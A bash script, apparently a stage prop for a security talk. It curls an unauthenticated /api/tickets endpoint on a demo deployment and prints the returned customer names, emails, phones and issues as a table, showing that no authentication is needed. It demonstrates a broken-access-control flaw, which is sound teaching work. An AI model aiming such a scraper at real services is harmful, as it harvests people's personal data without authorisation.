#!/usr/bin/env bash
# Live-demo prop for the "attacker's-eye view" segment (see ATTACKER-VIEW-RUNBOOK.md).
# Does nothing an attacker's browser couldn't already do — it just hits the same
# unauthenticated endpoint the app itself exposes and prints the response as a
# table instead of raw JSON, so it reads on stage.
#
# Usage: ./attacker-scrape.sh [base-url]
#   defaults to the deployed Vercel URL if no argument is given.

set -euo pipefail

BASE_URL="${1:-https://peopledesk-demo.vercel.app}"

echo "[+] Requesting ${BASE_URL}/api/tickets ..."
echo "[+] No credentials, no token, no session — plain GET."
echo

RESPONSE=$(curl -s -f "${BASE_URL}/api/tickets")

node -e '
const data = JSON.parse(require("fs").readFileSync(0, "utf8"));
console.log(`[+] Received ${data.length} customer record(s). Authentication required: none.\n`);
const pad = (s, n) => String(s ?? "").padEnd(n);
console.log(pad("NAME", 22) + pad("EMAIL", 30) + pad("PHONE", 18) + "ISSUE");
console.log("-".repeat(90));
for (const t of data) {
  console.log(pad(t.name, 22) + pad(t.email, 30) + pad(t.phone, 18) + (t.issue || ""));
}
console.log();
console.log("[+] Elapsed: well under a second. Same command works at any scale.");
' <<< "$RESPONSE"
